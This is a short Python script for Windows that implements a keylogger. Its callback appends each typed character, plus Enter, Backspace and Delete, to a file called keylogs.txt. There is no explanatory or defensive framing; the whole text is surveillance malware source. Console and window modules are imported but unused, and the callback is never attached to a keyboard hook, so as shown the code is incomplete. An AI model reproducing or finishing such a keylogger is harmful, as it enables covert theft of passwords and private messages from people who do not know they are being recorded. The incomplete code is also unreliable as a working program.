import pythoncom
from pywintypes import com_error
import win32api, win32console, win32gui
import os

def OnKeyboardEvent(event):
    if event.Ascii > 0:
        with open("keylogs.txt", "a") as f:
            f.write(chr(event.Ascii))
    else:
        if event.Key == "VK_RETURN":
            with open("keylogs.txt", "a") as f:
                f.write("\n")
        elif event.Key == "VK_BACK":
            with open("keylogs.txt", "a") as f:
                f.write("\b")
        elif event.Key == "VK_DELETE":
            with open("keylogs.txt", "a") as f:
                f.write("\u007F") # UTF-8 delete character
    return True

pythoncom.PumpMessages()
